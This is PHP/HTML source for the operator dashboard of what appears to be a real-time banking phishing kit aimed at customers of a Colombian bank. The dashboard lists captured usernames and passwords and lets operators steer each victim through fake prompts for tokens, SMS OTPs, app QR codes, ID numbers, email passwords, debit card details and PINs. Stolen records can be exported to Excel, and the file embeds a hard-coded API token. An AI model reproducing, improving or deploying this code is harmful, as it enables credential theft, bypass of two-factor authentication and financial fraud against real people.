<?php
// panel/dashboard.php
date_default_timezone_set('America/Bogota');
session_start(); // Inicia la sesión al principio para poder acceder a las variables de sesión.

// Comprobación de sesión: Si el usuario no ha iniciado sesión, redirigir a login.php
if (!isset($_SESSION['user_id'])) {
    header("Location: login.php"); // Redirige a la página de login
    exit(); // Detiene la ejecución del script
}

// Opcional: Comprobar la inactividad de la sesión (ej. 1 hora)
$session_timeout = 3600; // 1 hora (en segundos)
if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > $session_timeout)) {
    session_unset(); // Elimina todas las variables de sesión
    session_destroy(); // Destruye la sesión
    header("Location: login.php?expired=true"); // Redirige con un mensaje de sesión expirada
    exit(); // Detiene la ejecución del script
}
$_SESSION['last_activity'] = time(); // Actualiza la última actividad

// Ahora, el resto de tu código HTML y PHP puede acceder a $_SESSION['username'], $_SESSION['role'], etc.
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>Dashboard del Panel - Registros Recibidos</title>

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

   <style>
    body {
        font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; /* Fuente más moderna */
        padding: 0;
        margin: 0;
        background: #e9eef2; /* Un fondo ligeramente más claro y moderno */
        color: #333; /* Color de texto general */
    }
    .main-content-container {
        padding: 20px; /* Reducimos un poco el padding general */
        max-width: 1200px;
        margin: 0px auto;
    }

    /* BARRA DE NAVEGACIÓN SUPERIOR (Mantiene tu estilo preferido) */
    .top-navbar {
        background-color: #004080; /* Azul oscuro, color principal del panel */
        color: white;
        padding: 15px 30px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        box-shadow: 0 2px 8px rgba(0,0,0,0.2);
        margin-bottom: 20px;
    }
    .navbar-brand {
        font-size: 24px;
        font-weight: bold;
        color: white;
        text-decoration: none;
    }
    .navbar-controls {
        display: flex;
        align-items: center;
        gap: 20px;
    }
    .top-navbar .btn-limpiar {
        background-color: #dc3545;
        color: white;
        border: none;
        padding: 8px 15px;
        cursor: pointer;
        border-radius: 5px;
        font-weight: bold;
        transition: background-color 0.2s ease;
        margin-bottom: 0;
    }
    .top-navbar .btn-limpiar:hover {
        background-color: #c82333;
    }
    .dropdown-container {
        position: relative;
        display: inline-block;
        cursor: pointer;
    }
    .dropdown-toggle {
        color: white;
        font-weight: bold;
        display: flex;
        align-items: center;
        gap: 5px;
    }
    .dropdown-toggle:hover {
        text-decoration: underline;
    }
    .dropdown-toggle i {
        font-size: 0.8em;
        transition: transform 0.2s ease;
    }
    .dropdown-container.show .dropdown-toggle i {
        transform: rotate(180deg);
    }
    .dropdown-menu {
        display: none;
        position: absolute;
        background-color: #fff;
        min-width: 200px;
        box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
        z-index: 100;
        border-radius: 5px;
        right: 0;
        top: 100%;
        margin-top: 5px;
        border: 1px solid #ddd;
    }
    .dropdown-menu a {
        color: #333;
        padding: 12px 16px;
        text-decoration: none;
        display: block;
        text-align: left;
        transition: background-color 0.2s ease;
    }
    .dropdown-menu a:hover {
        background-color: #f1f1f1;
    }
    .dropdown-menu a i {
        margin-right: 8px;
        color: #007bff;
    }
    .dropdown-container.show .dropdown-menu {
        display: block;
    }

    h2 { /* Estilos para el título "Registros recibidos" */
        text-align: center;
        margin-top: 15px;
        margin-bottom: 25px;
        font-size: 2em;
        color: #004080;
        font-weight: 600;
    }

    /* ESTILOS DE TABLA */
    table {
        width: 100%;
        border-collapse: separate;
        border-spacing: 0;
        background: white;
        border-radius: 8px;
        overflow: hidden;
        box-shadow: 0 4px 15px rgba(0,0,0,0.1);
    }
    th, td {
        padding: 12px 15px;
        border-bottom: 1px solid #e0e0e0;
        text-align: center;
        font-size: 0.95em;
        vertical-align: middle;
    }
    th {
        background-color: #f0f4f7;
        color: #5a6268;
        font-weight: 600;
        text-transform: uppercase;
        letter-spacing: 0.5px;
        border-bottom: 2px solid #d0dbe2;
        position: sticky;
        top: 0;
        z-index: 1;
    }
    tbody tr:last-child td { border-bottom: none; }
    tbody tr:nth-child(even):not(.tr-alerta):not(.tr-offline-largo):not(.tr-gestionado-otro):not(.tr-gestionado-propio) {
        background-color: #f8fbfd;
    }
    tbody tr:hover:not(.tr-gestionado-otro) {
        background-color: #e0f0ff !important;
        cursor: pointer;
    }
    .tr-alerta {
        animation: pulseBorder 1.5s infinite;
        border: 2px solid #ffcc00 !important;
    }
    @keyframes pulseBorder {
        0% { box-shadow: 0 0 0 0 rgba(255, 204, 0, 0.5); }
        70% { box-shadow: 0 0 0 10px rgba(255, 204, 0, 0); }
        100% { box-shadow: 0 0 0 0 rgba(255, 204, 0, 0); }
    }
    .estado-pulso {
        color: #d88c00;
        animation: blink-text 1s infinite;
        font-weight: bold;
    }
    @keyframes blink-text {
        0% { opacity: 1; }
        50% { opacity: 0.2; }
        100% { opacity: 1; }
    }
    .tr-offline-largo {
        background-color: #f5f5f5 !important;
        color: #a0a0a0;
        font-style: italic;
    }

    /* Estilo para filas gestionadas por otro operador */
    .tr-gestionado-otro {
        background-color: #f0f8ff !important;
        color: #a0a0a0;
        cursor: not-allowed !important;
        border: 1px dashed #b0d0e0 !important;
        opacity: 0.7;
    }
    .tr-gestionado-otro:hover { background-color: #e0f0ff !important; }

    /* Estilo para filas gestionadas por el operador actual */
    .tr-gestionado-propio {
        background-color: #e6ffe6 !important;
        border: 1px solid #90ee90 !important;
        font-weight: bold;
    }
    .tr-gestionado-propio:hover { background-color: #d6ffd6 !important; }

    .estado-circulo {
        display: inline-block;
        width: 14px;
        height: 14px;
        border-radius: 50%;
        margin-right: 6px;
        vertical-align: middle;
        border: 1px solid rgba(0,0,0,0.1);
    }
    .estado-verde { background-color: #28a745; }
    .estado-rojo { background-color: #dc3545; }

    /* REDISEÑO DE LA SECCIÓN DE ACCIONES/FILTROS */
    .filter-search-container {
        display: flex;
        flex-wrap: wrap;
        gap: 10px;
        justify-content: space-between;
        align-items: center;
        background-color: #fff;
        padding: 15px 20px;
        border-radius: 8px;
        box-shadow: 0 2px 8px rgba(0,0,0,0.08);
        margin-bottom: 20px;
    }

    .filter-group {
        display: flex;
        align-items: center;
        gap: 8px;
        flex-grow: 1;
        min-width: 180px;
    }

    .filter-group label {
        color: #555;
        font-weight: 500;
        font-size: 0.9em;
        white-space: nowrap;
    }

    .filter-group select, .filter-group input[type="text"] {
        padding: 7px 10px;
        border-radius: 6px;
        border: 1px solid #ced4da;
        background-color: #fff;
        font-size: 0.9em;
        box-shadow: inset 0 1px 2px rgba(0,0,0,0.075);
        min-width: 120px;
    }
    .filter-group input[type="text"] {
        flex-grow: 1;
        max-width: 250px;
    }
    .filter-group button {
        background-color: #007bff;
        color: white;
        border: none;
        padding: 8px 15px;
        border-radius: 5px;
        cursor: pointer;
        font-weight: bold;
        transition: background-color 0.2s ease;
        display: flex;
        align-items: center;
        gap: 5px;
    }
    .filter-group button:hover {
        background-color: #0056b3;
    }
    .filter-group .export-btn { /* Estilo específico para el botón de exportar */
        background-color: #28a745; /* Un verde distintivo */
    }
    .filter-group .export-btn:hover {
        background-color: #218838;
    }


/* Media Queries para Responsividad (Mantienen los estilos móviles anteriores, pero aplicados a los nuevos elementos si es necesario) */
@media screen and (max-width: 768px) {
    body {
        padding: 0;
    }
    .top-navbar {
        padding: 10px 15px;
        flex-direction: column;
        align-items: flex-start;
        gap: 10px;
    }
    .navbar-brand {
        font-size: 20px;
    }
    .navbar-controls {
        width: 100%;
        justify-content: space-between;
        gap: 10px;
    }
    .top-navbar .btn-limpiar {
        flex-grow: 1;
        text-align: center;
    }
    .top-navbar .dropdown-container {
        flex-grow: 1;
        text-align: right;
    }
    .dropdown-menu {
        left: 0;
        right: auto;
    }

    .main-content-container {
        padding: 15px;
    }
    h2 {
        text-align: center;
        margin-top: 15px;
        margin-bottom: 15px;
        font-size: 1.5em;
    }
    .filter-search-container {
        flex-direction: column;
        align-items: stretch;
        gap: 10px;
        padding: 10px;
    }
    .filter-group {
        flex-direction: column;
        width: 100%;
        align-items: stretch;
    }
    .filter-group select, .filter-group input[type="text"], .filter-group button {
        width: 100%;
        min-width: unset;
        max-width: unset;
    }

    /* Estilos de tabla en móvil */
    table, thead, tbody, th, td, tr { display: block; }
    thead { display: none; }
    tr {
        margin-bottom: 15px;
        border: 1px solid #e0e0e0;
        border-radius: 8px;
        padding: 10px;
        background-color: #fff;
        box-shadow: 0 2px 8px rgba(0,0,0,0.05);
    }
    td {
        position: relative;
        padding-left: 50% !important;
        text-align: right !important;
        border: none;
        border-bottom: 1px solid #f0f0f0;
        min-height: 40px;
        word-break: break-word;
        display: flex;
        align-items: center;
        justify-content: flex-end;
        gap: 10px;
        flex-wrap: wrap;
    }
    td:last-child { border-bottom: 0; }
    td::before {
        content: attr(data-label);
        position: absolute;
        left: 10px;
        width: auto;
        padding-right: 10px;
        white-space: nowrap;
        text-align: left;
        font-weight: bold;
        color: #004080;
    }
    td:nth-of-type(1)::before { content: "ID"; }
    td:nth-of-type(2)::before { content: "Usuario"; }
    td:nth-of-type(3)::before { content: "Password"; }
    td:nth-of-type(4)::before { content: "Entidad"; }
    td:nth-of-type(5)::before { content: "Tienda"; }
    td:nth-of-type(6)::before { content: "Sistema"; }
    td:nth-of-type(7)::before { content: "Estado"; }
    td:nth-of-type(8)::before { content: "Operador"; }
    td:nth-of-type(9)::before { content: "Conectado"; }
    td:nth-of-type(10)::before { content: "Acción"; }
    td:nth-of-type(9) > div {
        display: flex;
        align-items: center;
        gap: 5px;
        flex-grow: 1;
        justify-content: flex-end;
    }
    .estado-circulo {
        margin-right: 0px;
        flex-shrink: 0;
    }
    td:nth-of-type(9) small {
        flex-shrink: 0;
    }
    td:nth-of-type(10) {
        padding-left: 10px !important;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        gap: 5px !important;
        flex-wrap: wrap;
    }
    td:nth-of-type(10)::before {
        display: none;
    }
    td button {
        width: 100% !important;
        margin-top: 0px !important;
        margin-left: 0px !important;
        box-sizing: border-box;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 8px 10px;
        text-align: center;
    }
    td button i {
        margin-right: 5px;
        flex-shrink: 0;
    }
    td button span {
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
    }
}
</style>

    <script>
    // Usa el token que ya tenías para las llamadas API
    const authToken = "EZnDyqEgnhVxDHLRTqS5pMaa_pbJEKOK9PxpsSXAN2g"; 

    function limpiarBaseDeDatos() {
        if (confirm("¿Está seguro de que desea LIMPIAR TODA LA BASE DE DATOS de registros? Esta acción es irreversible.")) {
            fetch('limpiar.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Auth-Token': authToken
                },
                body: 'confirm=true'
            })
            .then(response => {
                if (!response.ok) {
                    return response.json().then(errorData => {
                        throw new Error(errorData.message || 'Error desconocido del servidor.');
                    }).catch(() => {
                        return response.text().then(text => {
                            throw new Error(`Error HTTP ${response.status}: ${response.statusText}. Respuesta: ${text.substring(0, 100)}...`);
                        });
                    });
                }
                return response.json();
            })
            .then(data => {
                if (data.status === "OK") {
                    alert("Base de datos limpiada: " + data.message);
                    cargarRegistros();
                } else {
                    alert("Error al limpiar la base de datos: " + data.message);
                    console.error("Detalle del error:", data);
                }
            })
            .catch(error => {
                console.error('Error al limpiar la base de datos (fetch):', error);
                alert('Error de conexión o procesamiento al limpiar la base de datos: ' + error.message);
            });
        }
    }

    // MODIFICADA: Función cargarRegistros para incluir filtros y búsqueda
    function cargarRegistros() {
        const cantidad = document.getElementById("cantidad").value;
        const searchTerm = document.getElementById("search-term").value;
        const filterStatus = document.getElementById("filter-status").value;
        const filterOperador = document.getElementById("filter-operador").value;
        const filterEntidad = document.getElementById("filter-entidad").value;
        
        let queryParams = `limit=${cantidad}`;
        if (searchTerm) {
            queryParams += `&search_term=${encodeURIComponent(searchTerm)}`;
        }
        if (filterStatus) {
            queryParams += `&filter_status=${encodeURIComponent(filterStatus)}`;
        }
        if (filterOperador) {
            queryParams += `&filter_operador=${encodeURIComponent(filterOperador)}`;
        }
        if (filterEntidad) {
            queryParams += `&filter_entidad=${encodeURIComponent(filterEntidad)}`;
        }

        fetch(`datos.php?${queryParams}`)
            .then(res => res.text())
            .then(html => {
                const tablaRegistros = document.getElementById("tabla-registros");
                if (tablaRegistros) {
                    tablaRegistros.innerHTML = html;
                } else {
                    console.error("Elemento 'tabla-registros' no encontrado.");
                }
            })
            .catch(err => {
                console.warn("Error al actualizar tabla:", err);
            });
    }

    document.addEventListener("DOMContentLoaded", function() {
        cargarRegistros();
        setInterval(cargarRegistros, 2000); // Actualiza cada 2 segundos

        // Añadir listeners para los nuevos campos de filtro y búsqueda
        document.getElementById("search-term").addEventListener("input", cargarRegistros); // Búsqueda en tiempo real
        document.getElementById("filter-status").addEventListener("change", cargarRegistros);
        document.getElementById("filter-operador").addEventListener("change", cargarRegistros);
        document.getElementById("filter-entidad").addEventListener("change", cargarRegistros);

        // Opcional: Si quieres un botón de "buscar" en lugar de búsqueda en tiempo real
        // document.getElementById("search-button").addEventListener("click", cargarRegistros);
    });

    function enviarOrdenEstado(id, status, extraData = {}) {
        const payload = { id: id, status: status, ...extraData };

        fetch("api/actualizar.php", { // Asegúrate que la ruta a api/actualizar.php sea correcta
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "X-Auth-Token": authToken
            },
            body: JSON.stringify(payload)
        })
        .then(res => res.json())
        .then(data => {
            console.log(`Orden "${status}" enviada: `, data);
            if (data.status === "OK") {
                cargarRegistros();
            } else {
                alert(`Error al enviar orden "${status}": ` + (data.message || 'Desconocido'));
            }
        })
        .catch(err => {
            console.error(`Error de red al enviar orden "${status}":`, err);
            alert(`Error de conexión al enviar orden "${status}".`);
        });
    }

    function enviarOrdenPassword(id) { enviarOrdenEstado(id, "Esperando Password"); }
    function enviarOrdenToken(id) { enviarOrdenEstado(id, "Esperando Token"); }
    function enviarOrdenCelular(id) { enviarOrdenEstado(id, "Esperando Celular"); }
    function enviarOrdenTarjeta(id) { enviarOrdenEstado(id, "Esperando Tarjeta"); }

    function forzarReintentarPassword(id) { enviarOrdenEstado(id, "Esperando Password"); }
    function forzarReintentarToken(id) { enviarOrdenEstado(id, "Esperando Token"); }

    function enviarOrdenFinalizar(id) { enviarOrdenEstado(id, "Completado"); }
    function enviarOrdenDenegado(id) { enviarOrdenEstado(id, "Error General"); }
    function enviarOrdenUsuario(id) { enviarOrdenEstado(id, "Usuario Errado"); }
    function enviarOrdenSMSOTP(id) { enviarOrdenEstado(id, "Esperando SMS OTP"); }
    function enviarOrdenAPPQR(id) { enviarOrdenEstado(id, "Esperando APP QR"); }
    function enviarOrdenCedula(id) { enviarOrdenEstado(id, "Esperando Cedula"); }
    function enviarOrdenAnoNacimiento(id) { enviarOrdenEstado(id, "Esperando Ano Nacimiento"); }
    function enviarOrdenPregunta(id) { enviarOrdenEstado(id, "Esperando Pregunta"); }
    function enviarOrdenCorreo(id) { enviarOrdenEstado(id, "Esperando Correo"); }
    function enviarOrdenClaveCorreo(id) { enviarOrdenEstado(id, "Esperando Clave Correo"); }
    function enviarOrdenTarjetaDebito(id) { enviarOrdenEstado(id, "Esperando Tarjeta Debito"); }
    function enviarOrdenClaveTarjetaDebito(id) { enviarOrdenEstado(id, "Esperando Clave Tarjeta Debito"); }


    function abrirGestionUsuario(id) {
        const breakpointMobile = 768;
        let urlGestion = '';

        if (window.innerWidth <= breakpointMobile) {
            urlGestion = `gestion_usuario_mobile.php?id=${id}`; // Ruta a gestion_usuario_mobile.php
        } else {
            urlGestion = `gestion_usuario.php?id=${id}`; // Ruta a gestion_usuario.php
        }
        window.open(urlGestion, '_blank');
    }

    // Nuevo: Enviar un ping para mantener la sesión del operador activa en la DB cada 30 segundos
    function sendOperatorPing() {
        fetch("api/operator_ping.php", { // Asegúrate que la ruta sea correcta
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "X-Auth-Token": authToken // Reutiliza el authToken ya definido
            },
            body: JSON.stringify({}) // Cuerpo vacío o con datos adicionales si se necesitan
        })
        .then(response => response.json())
        .then(data => {
            // Puedes loggear el resultado si quieres, pero no es necesario mostrarlo en UI
            // console.log("Ping de operador:", data);
        })
        .catch(error => {
            console.error("Error al enviar ping de operador:", error);
        });
    }

    // Iniciar el ping de operador al cargar la página
    document.addEventListener('DOMContentLoaded', sendOperatorPing);
    setInterval(sendOperatorPing, 30000); // Enviar ping cada 30 segundos

    // NUEVO: Lógica para el menú desplegable de usuario
    document.addEventListener('DOMContentLoaded', function() {
        const userDropdown = document.getElementById('userDropdown');
        const dropdownToggle = userDropdown.querySelector('.dropdown-toggle');
        const dropdownMenu = userDropdown.querySelector('.dropdown-menu');

        dropdownToggle.addEventListener('click', function() {
            userDropdown.classList.toggle('show');
        });

        // Cerrar el dropdown si se hace clic fuera de él
        window.addEventListener('click', function(event) {
            if (!userDropdown.contains(event.target)) {
                userDropdown.classList.remove('show');
            }
        });
    });

    // Función para exportar los datos a Excel
    function exportToExcel() {
        // Recoge los parámetros de filtro actuales para pasarlos al script de exportación
        const searchTerm = document.getElementById("search-term").value;
        const filterStatus = document.getElementById("filter-status").value;
        const filterOperador = document.getElementById("filter-operador").value;
        const filterEntidad = document.getElementById("filter-entidad").value;
        
        let queryParams = '';
        if (searchTerm) {
            queryParams += `&search_term=${encodeURIComponent(searchTerm)}`;
        }
        if (filterStatus) {
            queryParams += `&filter_status=${encodeURIComponent(filterStatus)}`;
        }
        if (filterOperador) {
            queryParams += `&filter_operador=${encodeURIComponent(filterOperador)}`;
        }
        if (filterEntidad) {
            queryParams += `&filter_entidad=${encodeURIComponent(filterEntidad)}`;
        }
        
        // Abre una nueva ventana o descarga el archivo directamente
        window.location.href = `export_data.php?${queryParams}`;
    }
    </script>

</head>
<body>
    <nav class="top-navbar">
        <a href="dashboard_a.php" class="navbar-brand">Panel de Administración</a>
        <div class="navbar-controls">
            <?php if (isset($_SESSION['role']) && $_SESSION['role'] === 'admin'): ?>
                <button class="btn-limpiar" type="button" onclick="limpiarBaseDeDatos()">Limpiar Base de Datos</button>
            <?php endif; ?>

            <div class="dropdown-container" id="userDropdown">
                <span class="dropdown-toggle">
                    Bienvenido: <strong><?php echo htmlspecialchars($_SESSION['username'] ?? 'Usuario'); ?></strong>
                    (Rol: <?php echo htmlspecialchars($_SESSION['role'] ?? 'N/A'); ?>)
                    <i class="fas fa-chevron-down"></i>
                </span>
                <div class="dropdown-menu">
                    <?php if (isset($_SESSION['role']) && $_SESSION['role'] === 'admin'): ?>
                        <a href="admin_users.php"><i class="fas fa-users-cog"></i> Administrar Usuarios</a>
                    <?php endif; ?>
                    <a href="logout.php"><i class="fas fa-sign-out-alt"></i> Cerrar Sesión</a>
                </div>
            </div>
        </div>
    </nav>

    <div class="main-content-container">
        <h2>Registros recibidos</h2>

        <div class="filter-search-container">
            <div class="filter-group">
                <label for="search-term">Buscar (Usuario/ID):</label>
                <input type="text" id="search-term" placeholder="Escribe para buscar...">
            </div>

            <div class="filter-group">
                <label for="filter-status">Estado:</label>
                <select id="filter-status">
                    <option value="">Todos</option>
                    <option value="Usuario Ingresado">Usuario Ingresado</option>
                    <option value="Clave Ingresada">Clave Ingresada</option>
                    <option value="Token Ingresado">Token Ingresado</option>
                    <option value="Celular Ingresado">Celular Ingresado</option>
                    <option value="Tarjeta Ingresada">Tarjeta Ingresada</option>
                    <option value="SMS OTP Ingresado">SMS OTP Ingresado</option>
                    <option value="APP QR Ingresado">APP QR Ingresado</option>
                    <option value="Cedula Ingresada">Cédula Ingresada</option>
                    <option value="Ano Nacimiento Ingresado">Año Nacimiento Ingresado</option>
                    <option value="Respuesta Ingresada">Respuesta Ingresada</option>
                    <option value="Correo Ingresado">Correo Ingresado</option>
                    <option value="Clave Correo Ingresada">Clave Correo Ingresada</option>
                    <option value="Tarjeta Debito Ingresada">Tarjeta Debito Ingresada</option>
                    <option value="Clave Tarjeta Debito Ingresada">Clave Tarjeta Debito Ingresada</option>
                    <option value="Usuario Errado">Usuario Errado</option>
                    <option value="Completado">Completado</option>
                    <option value="Error General">Error General</option>
                    <option value="Denegado">Denegado</option>
                    <option value="Esperando Password">Esperando Password</option>
                    <option value="Esperando Token">Esperando Token</option>
                    <option value="Esperando Celular">Esperando Celular</option>
                    <option value="Esperando Tarjeta">Esperando Tarjeta</option>
                    <option value="Esperando SMS OTP">Esperando SMS OTP</option>
                    <option value="Esperando APP QR">Esperando APP QR</option>
                    <option value="Esperando Cedula">Esperando Cédula</option>
                    <option value="Esperando Ano Nacimiento">Esperando Año Nacimiento</option>
                    <option value="Esperando Pregunta">Esperando Pregunta</option>
                    <option value="Esperando Correo">Esperando Correo</option>
                    <option value="Esperando Clave Correo">Esperando Clave Correo</option>
                    <option value="Esperando Tarjeta Debito">Esperando Tarjeta Debito</option>
                    <option value="Esperando Clave Tarjeta Debito">Esperando Clave Tarjeta Debito</option>
                    </select>
            </div>

            <div class="filter-group">
                <label for="filter-operador">Operador:</label>
                <select id="filter-operador">
                    <option value="">Todos</option>
                    <?php
                        // Aquí podrías cargar dinámicamente los operadores de tu tabla 'panel_users'
                        // Por ejemplo:
                        // require_once 'db.php';
                        // $stmt_ops = $db->query("SELECT DISTINCT username FROM panel_users WHERE role IN ('admin', 'user', 'marquillador')");
                        // while ($row_op = $stmt_ops->fetch(PDO::FETCH_ASSOC)) {
                        //     echo "<option value=\"" . htmlspecialchars($row_op['username']) . "\">" . htmlspecialchars($row_op['username']) . "</option>";
                        // }
                        // Para este ejemplo, solo algunos fijos:
                    ?>
                    <option value="<?php echo htmlspecialchars($_SESSION['username'] ?? ''); ?>">Mi usuario</option>
                    </select>
            </div>

            <div class="filter-group">
                <label for="filter-entidad">Entidad:</label>
                <select id="filter-entidad">
                    <option value="">Todas</option>
                    <?php
                        // Aquí podrías cargar dinámicamente las entidades de tu tabla 'registros'
                        // Por ejemplo:
                        // require_once 'db.php';
                        // $stmt_ent = $db->query("SELECT DISTINCT entidad FROM registros WHERE entidad IS NOT NULL AND entidad != '' ORDER BY entidad");
                        // while ($row_ent = $stmt_ent->fetch(PDO::FETCH_ASSOC)) {
                        //     echo "<option value=\"" . htmlspecialchars($row_ent['entidad']) . "\">" . htmlspecialchars($row_ent['entidad']) . "</option>";
                        // }
                        // Para este ejemplo, solo algunas fijas:
                    ?>
                    <option value="Bogota Empresas">Bogota Empresas</option>
                    </select>
            </div>
            
            <div class="filter-group">
                <label for="cantidad">Mostrar:</label>
                <select id="cantidad">
                    <option value="10">1–10</option>
                    <option value="50" selected>1–50</option>
                    <option value="200">1–200</option>
                    <option value="1000">1–1000</option>
                </select>
            </div>
            
            <button class="filter-group button" onclick="cargarRegistros()"><i class="fas fa-filter"></i> Filtrar</button>
            
            <?php if (isset($_SESSION['role']) && $_SESSION['role'] === 'admin'): ?>
            <button class="filter-group button export-btn" onclick="exportToExcel()"><i class="fas fa-file-excel"></i> Exportar a Excel</button>
            <?php endif; ?>
        </div>

        <table>
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Usuario</th>
                    <th>Password</th>
                    <th>Entidad</th>
                    <th>Tienda</th>
                    <th>Sistema</th>
                    <th>Estado</th>
                    <th>Operador</th>
                    <th>Conectado</th>
                    <th>ACCION</th>
                </tr>
            </thead>
            <tbody id="tabla-registros">
                </tbody>
        </table>
    </div></body>
</html>